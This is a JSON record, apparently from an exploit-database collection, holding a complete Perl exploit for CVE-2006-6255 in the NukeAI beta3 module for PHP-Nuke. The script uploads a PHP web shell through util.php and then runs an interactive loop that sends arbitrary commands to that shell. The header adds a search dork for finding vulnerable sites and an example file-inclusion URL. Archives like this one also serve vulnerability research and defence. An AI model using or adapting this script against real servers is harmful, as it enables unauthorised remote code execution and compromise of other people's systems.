{
  "id": "2843",
  "title": "PHP-Nuke NukeAI Module 3b - &#039;util.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-6255",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n#\r\n+-------------------------------------------------------------------------------------------\r\n# + nukeai beta3 (util.php) Remote Code Execution Vulnerability\r\n#\r\n+-------------------------------------------------------------------------------------------\r\n# + Affected Software .: nukeai beta3\r\n# + Download ..........: http://mesh.dl.sourceforge.net/sourceforge/nukeai/nukeai_beta3.zip\r\n# + Dork ..............: \"nukeai beta3\"\r\n# + Class .............: Remote Code Execution\r\n# + Risk ..............: High (Remote Code Execution)\r\n# + Found By ..........: DeltahackingTEAM Code :Dr.Trojan&Dr.Pantagon\r\n# + Exploit:http://[target]/[path]/modules/NukeAI/util.php?AIbasedir=http://\r\n# +-------------------------------------------------------------------------------------------\r\n# + Details:\r\n# + nukeai beta3 Download by default installation doesn't prevent any of the files in the\r\n# + modules/NukeAI directory from being accessed by a client. The modules/NukeAI\r\n# + file takes input passed to the script by util.php and writes it to $_POST[\"filename\"].0\r\n# + unsanatized in the modules/NukeAI descriptions directory.\r\n# +\r\n# + Vulnerable Code:\r\n# +require_once $AIbasedir.\"/NukeAI/util.php\";\r\n# +-------------------------------------------------------------------------------------------\r\n# Example: http://[site]/modules/NukeAI/util.php?AIbasedir=[php shell]\r\n\r\nuse Getopt::Long;\r\nuse URI::Escape;\r\nuse IO::Socket;\r\n\r\n$code = \"<?php passthru(\\$_GET[cmd]); ?>\";\r\n\r\nmain();\r\n\r\nsub usage\r\n{\r\n    print \"DeltahackingSecurityTEAM\\n\";\r\n    print \"www.deltahacking.net\\n\";\r\n    print \"Dr.Trojan,HIV++,D_7j,Lord,VPc,IMpostor,Dr.Pantagon\\n\";\r\n    print \" http://advistory.deltahacking.net((we Bug))\\n\";\r\n    print \"\\nukeai beta3 Remote Code Execution Exploit\\n\";\r\n    print \"-h, --host\\ttarget host\\t(example.com)\\n\";\r\n    print \"-f, --file\\tshell file\\t(shell.php)\\n\";\r\n    print \"-d, --dir\\tinstall dir\\t(/NukeAI)\\n\";\r\n    print \"============================================================================farzad.sharifi\\r\\n\";\r\n    exit;\r\n}\r\n\r\nsub main\r\n{\r\n    GetOptions ('h|host=s' => \\$host,'f|file=s' => \\$file,'d|dir=s' => \\$dir);\r\n    usage() unless $host;\r\n\r\n    $dir = \"/NukeAI\" unless $dir;\r\n    $file = \"shell.php\" unless $file;\r\n    uri_escape($cmd);\r\n    $sock = IO::Socket::INET->new(Proto=>\"tcp\",PeerAddr=>\"$host\",PeerPort=>\"80\") or die \"\\nconnect() failed.\\n\";\r\n\r\n    print \"\\nconnected to \".$host.\", sending data.\\n\";\r\n    $sendurl = \"description=0&moreinfo=\".$code.\"&accesses=0&filename=\".$file.\"&date=&B1=Submit\";\r\n    $sendlen = length($sendurl);\r\n    print $sock \"POST \".$dir.\"NukeAI/util.php?AIbasedir= HTTP/1.1\\n\";\r\n    print $sock \"Host: \".$host.\"\\n\";\r\n    print $sock \"Connection: close\\n\";\r\n    print $sock \"Content-Type: application/x-www-form-urlencoded\\n\";\r\n    print $sock \"Content-Length: \".$sendlen.\"\\n\\n\";\r\n    print $sock $sendurl;\r\n    print \"attempted to create php shell, server response:\\n\\n\";\r\n    while($recvd = <$sock>)\r\n    {\r\n        print \" \".$recvd.\"\";\r\n    }\r\n\r\n    while($cmd !~ \"~quit\")\r\n    {\r\n        print \"\\n\\n-> \";\r\n        $cmd = <STDIN>;\r\n        if ($cmd !~ \"~quit\")\r\n        {\r\n          $sock = IO::Socket::INET->new(Proto=>\"tcp\",PeerAddr=>\"$host\",PeerPort=>\"80\")\r\n           or die \"connect() failed.\\n\";\r\n          $sendurl = uri_escape($cmd);\r\n\r\n          print $sock \"GET \".$dir.\"/descriptions/\".$file.\".0?cmd=\".$sendurl.\" HTTP/1.1\\n\";\r\n          print $sock \"Host: \".$host.\"\\n\";\r\n          print $sock \"Accept: */*\\n\";\r\n          print $sock \"Connection: close\\n\\n\";\r\n          print \"\\n\";\r\n\r\n          while($recvd = <$sock>)\r\n          {\r\n              print $recvd;\r\n          }\r\n        }\r\n    }\r\n    exit;\r\n}\r\n\r\n# milw0rm.com [2006-11-24]",
  "url": "https://www.exploit-db.com/exploits/2843"
}